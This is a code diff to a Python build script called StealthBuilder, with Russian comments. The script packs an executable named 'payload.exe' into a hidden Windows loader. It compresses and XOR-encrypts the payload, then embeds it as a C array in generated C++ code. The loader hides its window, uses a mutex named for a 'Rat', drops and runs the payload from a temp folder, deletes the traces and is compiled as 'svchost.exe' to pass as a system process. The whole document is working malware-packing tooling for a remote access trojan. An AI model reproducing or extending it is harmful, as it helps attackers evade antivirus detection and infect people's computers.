@@ -1,4 +1,4 @@
-# build.py - БЫСТРАЯ СБОРКА с objcopy
+# build.py - Сборка с генерацией C массива (без зависаний)
 import os
 import sys
 import subprocess
@@ -64,84 +64,76 @@ class StealthBuilder:
         print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
         return "payload.exe"
     
+    def bytes_to_c_array_chunked(self, data, name, chunk_size=1024*1024):
+        """Конвертирует байты в C массив по частям (чтобы не зависать)"""
+        result = f'unsigned char {name}[] = {{\n    '
+        total = len(data)
+        written = 0
+        
+        while written < total:
+            chunk = data[written:written+chunk_size]
+            for i, b in enumerate(chunk):
+                if written + i > 0:
+                    result += ', '
+                result += f'0x{b:02X}'
+                if (written + i + 1) % 16 == 0:
+                    result += ',\n    '
+            written += len(chunk)
+            # Показываем прогресс
+            if written % (10 * chunk_size) == 0:
+                print(f"[+] Progress: {written}/{total} bytes ({written*100//total}%)")
+        
+        result += '\n};\n'
+        return result
+    
     def encrypt_and_build(self, exe_path):
-        """Шифрует EXE и создает загрузчик"""
+        """Шифрует EXE и создает загрузчик с C массивом"""
         print("[+] Encrypting EXE...")
         
         with open(exe_path, 'rb') as f:
             exe_data = f.read()
         
         # Сжимаем
+        print("[+] Compressing...")
         compressed = zlib.compress(exe_data, level=9)
         
         # XOR шифруем
+        print("[+] XOR encrypting...")
         encrypted = bytearray(compressed)
         for i in range(len(encrypted)):
             encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
         
-        # Сохраняем зашифрованные данные
-        with open('encrypted.bin', 'wb') as f:
-            f.write(encrypted)
-        
-        # Сохраняем ключ
-        with open('key.bin', 'wb') as f:
-            f.write(self.xor_key)
-        
         size_mb = len(encrypted) / (1024*1024)
         print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
         
-        # Конвертируем бинарные файлы в объектные через objcopy
-        print("[+] Converting to object files with objcopy...")
+        # Создаем загрузчик с встроенным массивом
+        print("[+] Creating loader with embedded data...")
         
-        # encrypted.bin → encrypted.o
-        cmd = [
-            'objcopy',
-            '-I', 'binary',
-            '-O', 'coff-i386',  # 32-bit COFF
-            '--rename-section', '.data=.rdata,readonly,contents,alloc,load,data',
-            'encrypted.bin',
-            'encrypted.o'
-        ]
-        result = subprocess.run(cmd, capture_output=True)
-        if result.returncode != 0:
-            print(f"[-] objcopy error (encrypted): {result.stderr.decode()}")
-            # Пробуем без опций
-            cmd = ['objcopy', '-I', 'binary', '-O', 'coff-i386', 'encrypted.bin', 'encrypted.o']
-            result = subprocess.run(cmd, capture_output=True)
-            if result.returncode != 0:
-                print(f"[-] objcopy error: {result.stderr.decode()}")
-                return None
+        # Конвертируем в C массив (по частям)
+        print("[+] Converting to C array (this may take a moment)...")
+        encrypted_array = self.bytes_to_c_array_chunked(encrypted, 'encrypted_dll')
+        key_array = self.bytes_to_c_array_chunked(self.xor_key, 'xor_key')
         
-        # key.bin → key.o
-        cmd = ['objcopy', '-I', 'binary', '-O', 'coff-i386', 'key.bin', 'key.o']
-        result = subprocess.run(cmd, capture_output=True)
-        if result.returncode != 0:
-            print(f"[-] objcopy error (key): {result.stderr.decode()}")
-            return None
-        
-        print("[+] Object files created!")
-        
-        # Создаем загрузчик
-        print("[+] Creating loader...")
-        
-        loader_code = '''
+        loader_code = f'''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-extern unsigned char _binary_encrypted_bin_start[];
-extern unsigned char _binary_encrypted_bin_end[];
-extern unsigned char _binary_key_bin_start[];
-extern unsigned char _binary_key_bin_end[];
+// Встроенные данные
+{encrypted_array}
+unsigned int encrypted_len = {len(encrypted)};
 
-static void xor_decrypt(unsigned char* data, size_t len, 
-                        unsigned char* key, size_t key_len) {
-    for (size_t i = 0; i < len; i++) {
+{key_array}
+unsigned int key_len = {len(self.xor_key)};
+
+static void xor_decrypt(unsigned char* data, unsigned int len, 
+                        unsigned char* key, unsigned int key_len) {{
+    for (unsigned int i = 0; i < len; i++) {{
         data[i] ^= key[i % key_len];
-    }
-}
+    }}
+}}
 
-static void RunEXE(unsigned char* exe_data, size_t exe_size) {
+static void RunEXE(unsigned char* exe_data, unsigned int exe_size) {{
     char temp_path[MAX_PATH];
     char exe_path[MAX_PATH];
     DWORD written;
@@ -169,33 +161,30 @@ static void RunEXE(unsigned char* exe_data, size_t exe_size) {
     
     Sleep(5000);
     DeleteFileA(exe_path);
-}
+}}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-                   LPSTR lpCmdLine, int nCmdShow) {
+                   LPSTR lpCmdLine, int nCmdShow) {{
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     
     HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
     
-    size_t dll_len = _binary_encrypted_bin_end - _binary_encrypted_bin_start;
-    size_t key_len = _binary_key_bin_end - _binary_key_bin_start;
-    
-    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
+    unsigned char* decrypted = (unsigned char*)malloc(encrypted_len);
     if (!decrypted) return 1;
     
-    memcpy(decrypted, _binary_encrypted_bin_start, dll_len);
+    memcpy(decrypted, encrypted_dll, encrypted_len);
     
-    xor_decrypt(decrypted, dll_len, _binary_key_bin_start, key_len);
+    xor_decrypt(decrypted, encrypted_len, xor_key, key_len);
     
-    RunEXE(decrypted, dll_len);
+    RunEXE(decrypted, encrypted_len);
     
     free(decrypted);
     
     while (1) Sleep(10000);
     
     return 0;
-}
+}}
 '''
         with open('loader_final.cpp', 'w') as f:
             f.write(loader_code)
@@ -210,8 +199,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             'g++',
             '-o', 'svchost.exe',
             loader_path,
-            'encrypted.o',  # ← Объектный файл!
-            'key.o',        # ← Объектный файл!
             '-static',
             '-s',
             '-O1',
